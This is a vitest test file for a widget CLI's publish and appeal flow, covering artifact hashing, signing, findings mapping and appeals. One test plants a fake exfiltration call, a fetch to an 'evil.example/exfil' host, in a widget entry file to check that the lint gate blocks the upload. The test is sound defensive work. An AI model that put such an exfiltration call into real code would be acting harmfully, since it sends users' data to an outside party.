/**
 * `publish` + `appeal` — unit and in-process integration coverage (FR-11).
 *
 * The registry is a **contract-faithful fake** (`test/helpers/fake-registry.ts`):
 * it runs the shared `src/checks` as its automated review, content-addresses parts
 * with the protocol hashing, and serves the publisher status/appeal surface. That
 * substitution (vs. standing up the real Postgres/OIDC/countersign service) is
 * called out in the PR; the flow it drives — lint-gate, keyless sign, upload, poll,
 * findings mapping, appeal — is the real code path.
 */
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { IO } from '../src/io.js';
import { runInit } from '../src/init/index.js';
import { assembleArtifact } from '../src/publish/artifact.js';
import { ephemeralSigner, ARTIFACT_PAYLOAD_TYPE } from '../src/publish/signing.js';
import { mapFindings, MANUAL_FINDING } from '../src/publish/findings.js';
import { runPublish, type PublishDeps } from '../src/publish/run.js';
import { runAppeal } from '../src/publish/appeal.js';
import type { AcquiredIdentity } from '../src/publish/identity.js';
import { FakeRegistry } from './helpers/fake-registry.js';

function capture(): { io: IO; out: () => string; err: () => string } {
  const outChunks: string[] = [];
  const errChunks: string[] = [];
  return {
    io: { out: (s) => outChunks.push(s), err: (s) => errChunks.push(s) },
    out: () => outChunks.join(''),
    err: () => errChunks.join(''),
  };
}

/** A fake acquired identity — no network, no Sigstore. */
const IDENTITY: AcquiredIdentity = {
  token: 'test.oidc.token',
  identity: {
    issuer: 'https://issuer.example',
    subject: 'dev@acme.example',
    subjectClaims: { email: 'dev@acme.example' },
    expiresAt: null,
  },
  provider: { getToken: () => Promise.resolve('test.oidc.token') },
};

/** Build the injected deps around one fake registry, with instant polling. */
function deps(registry: FakeRegistry): PublishDeps {
  return {
    assemble: (root) => assembleArtifact(root),
    acquireIdentity: () => Promise.resolve(IDENTITY),
    makeSigner: () => ephemeralSigner(),
    client: { transport: registry.transport() },
    sleep: () => Promise.resolve(),
  };
}

let tmp: string;

beforeEach(async () => {
  tmp = await mkdtemp(path.join(tmpdir(), 'gm-publish-'));
});
afterEach(async () => {
  await rm(tmp, { recursive: true, force: true });
});

/** Scaffold a clean widget project non-interactively; return its directory + tag. */
async function scaffold(name: string, publisher = 'acme'): Promise<{ dir: string; tag: string }> {
  const cap = capture();
  const code = await runInit({ name, publisher, kind: 'widget', framework: 'vanilla', json: true, cwd: tmp }, cap.io, { isTTY: false });
  expect(code, cap.err()).toBe(0);
  const { directory } = JSON.parse(cap.out()) as { directory: string };
  const dir = path.join(tmp, directory);
  const manifest = JSON.parse(await readFile(path.join(dir, 'manifest.json'), 'utf8')) as { tag: string };
  return { dir, tag: manifest.tag };
}

describe('assembleArtifact', () => {
  it('collects manifest + entry + schema + doc with roles and content hashes', async () => {
    const { dir } = await scaffold('assemble-me');
    const result = await assembleArtifact(dir);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    const { artifact } = result;

    const byRole = (role: string) => artifact.files.filter((f) => f.role === role).map((f) => f.path);
    expect(byRole('manifest')).toEqual(['manifest.json']);
    expect(byRole('entry')).toEqual(['src/entry.js']);
    expect(byRole('schema')).toContain('props.schema.json');
    expect(byRole('doc')).toContain('README.md');

    // The stories file and dev-only inputs are never uploaded.
    expect(artifact.files.some((f) => f.path.includes('.stories.'))).toBe(false);
    expect(artifact.files.some((f) => f.path === 'package.json')).toBe(false);

    // Every file is content-addressed with the protocol multihash.
    for (const f of artifact.files) {
      expect(f.hash).toMatch(/^sha2-256:[0-9a-f]{64}$/);
      expect(artifact.contentHashes[f.path]).toBe(f.hash);
    }
    expect(artifact.id).toBe(`${artifact.tag}@${artifact.version}`);
  });

  it('fails closed on a missing manifest', async () => {
    const result = await assembleArtifact(tmp);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.code).toBe('no-manifest');
  });

  it('fails closed when the manifest lacks entry/tag/version', async () => {
    await writeFile(path.join(tmp, 'manifest.json'), JSON.stringify({ name: 'x' }), 'utf8');
    const result = await assembleArtifact(tmp);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.code).toBe('invalid-manifest');
  });
});

describe('ephemeralSigner', () => {
  it('produces a DSSE-shaped envelope over the canonical subject', async () => {
    const env = await ephemeralSigner().sign({
      subject: { artifact: 'acme-x@1.0.0', contentHashes: { 'manifest.json': 'sha2-256:ab' }, issuer: 'i', subjectClaims: {} },
      token: 't',
    });
    expect(env.payloadType).toBe(ARTIFACT_PAYLOAD_TYPE);
    expect(env.signatures.length).toBeGreaterThan(0);
    expect(env.signatures[0]!.sig.length).toBeGreaterThan(0);
    // The payload decodes to the canonical subject JSON.
    const decoded = JSON.parse(Buffer.from(env.payload, 'base64').toString('utf8')) as { artifact: string };
    expect(decoded.artifact).toBe('acme-x@1.0.0');
  });
});

describe('mapFindings', () => {
  it('maps a check-id finding to its shared title + tier', () => {
    const [mapped] = mapFindings([{ checkId: 'sdk.raw-network', detail: 'raw fetch found' }]);
    expect(mapped!.title.length).toBeGreaterThan(0);
    expect(mapped!.tier).toBe('TF');
    expect(mapped!.checkId).toBe('sdk.raw-network');
  });

  it('renders the manual sentinel as a hand review', () => {
    const [mapped] = mapFindings([{ checkId: MANUAL_FINDING, detail: 'reviewed by hand' }]);
    expect(mapped!.title).toBe('manual review');
    expect(mapped!.tier).toBeUndefined();
  });
});

describe('runPublish', () => {
  it('refuses without a registry', async () => {
    const { dir } = await scaffold('need-registry');
    const cap = capture();
    const code = await runPublish(deps(new FakeRegistry()), { path: dir, json: true }, cap.io);
    expect(code).toBe(1);
    expect((JSON.parse(cap.out()) as { code: string }).code).toBe('no-registry');
  });

  it('fails closed on a lint failure and never uploads', async () => {
    const { dir } = await scaffold('lint-fails');
    // Plant a raw network reach in the entry — trips sdk.raw-network (a fail).
    const entry = path.join(dir, 'src', 'entry.js');
    await writeFile(entry, `${await readFile(entry, 'utf8')}\nglobalThis.fetch('https://evil.example/exfil');\n`, 'utf8');

    const registry = new FakeRegistry();
    const cap = capture();
    const code = await runPublish(deps(registry), { path: dir, registry: 'http://reg.test', json: true }, cap.io);
    expect(code).toBe(1);
    const report = JSON.parse(cap.out()) as { status: string; reason: string; results: { id: string; status: string }[] };
    expect(report.status).toBe('refused');
    expect(report.reason).toBe('lint-failed');
    expect(report.results.some((r) => r.id === 'sdk.raw-network' && r.status === 'fail')).toBe(true);
    // The load-bearing guarantee: nothing was uploaded.
    expect(registry.uploadAttempts).toBe(0);
  });

  it('signs, uploads, polls, and reaches the published state', async () => {
    const { dir } = await scaffold('happy-path');
    const registry = new FakeRegistry({ approveAfterPolls: 2 });
    const cap = capture();
    const code = await runPublish(deps(registry), { path: dir, registry: 'http://reg.test', json: true, poll: { attempts: 5, intervalMs: 0 } }, cap.io);
    expect(code, cap.err()).toBe(0);
    const report = JSON.parse(cap.out()) as { status: string; state: string; id: string };
    expect(report.status).toBe('published');
    expect(report.state).toBe('approved');
    // Exactly one artifact was uploaded, with a DSSE envelope the registry accepted.
    expect(registry.uploadAttempts).toBe(1);
    expect(registry.uploadedEnvelopes).toHaveLength(1);
  });

  it('prints a rejection\'s findings mapped to the shared lint check ids', async () => {
    const { dir, tag } = await scaffold('reject-me');
    const registry = new FakeRegistry({
      rejectTags: {
        [tag]: [
          { checkId: 'sdk.token-reach', detail: 'the widget reaches a host token path' },
          { checkId: MANUAL_FINDING, detail: 'reviewer found obfuscated exfil by hand' },
        ],
      },
    });
    const cap = capture();
    const code = await runPublish(deps(registry), { path: dir, registry: 'http://reg.test', poll: { attempts: 3, intervalMs: 0 } }, cap.io);
    expect(code).toBe(1);
    // The findings print in the same check-id vocabulary as `gridmason lint`.
    expect(cap.err()).toContain('sdk.token-reach');
    expect(cap.err()).toContain('manual');
    expect(cap.err()).toContain('same check ids as `gridmason lint`');
  });

  it('surfaces a registry upload error (tag not under the publisher prefix)', async () => {
    const { dir } = await scaffold('mine', 'notacme');
    const registry = new FakeRegistry({ publisherPrefix: 'acme' });
    const cap = capture();
    const code = await runPublish(deps(registry), { path: dir, registry: 'http://reg.test', json: true }, cap.io);
    expect(code).toBe(1);
    expect((JSON.parse(cap.out()) as { code: string }).code).toBe('tag_not_in_prefix');
  });
});

describe('runAppeal', () => {
  it('routes a rejected artifact to a second reviewer', async () => {
    const { dir, tag } = await scaffold('appeal-me');
    const registry = new FakeRegistry({ rejectTags: { [tag]: [{ checkId: MANUAL_FINDING, detail: 'first reviewer said no' }] } });

    // Publish → rejected, capturing the artifact id from the JSON report.
    const pub = capture();
    await runPublish(deps(registry), { path: dir, registry: 'http://reg.test', json: true, poll: { attempts: 3, intervalMs: 0 } }, pub.io);
    const { id } = JSON.parse(pub.out()) as { id: string };
    expect(id).toBeTruthy();

    // Appeal → routed to a second review.
    const cap = capture();
    const code = await runAppeal(
      { acquireIdentity: () => Promise.resolve(IDENTITY), client: { transport: registry.transport() } },
      { artifact: id, registry: 'http://reg.test', json: true },
      cap.io,
    );
    expect(code, cap.err()).toBe(0);
    expect((JSON.parse(cap.out()) as { status: string }).status).toBe('appealed');
  });

  it('refuses to appeal without a registry', async () => {
    const cap = capture();
    const code = await runAppeal(
      { acquireIdentity: () => Promise.resolve(IDENTITY), client: { transport: new FakeRegistry().transport() } },
      { artifact: 'art-1', json: true },
      cap.io,
    );
    expect(code).toBe(1);
    expect((JSON.parse(cap.out()) as { code: string }).code).toBe('no-registry');
  });
});
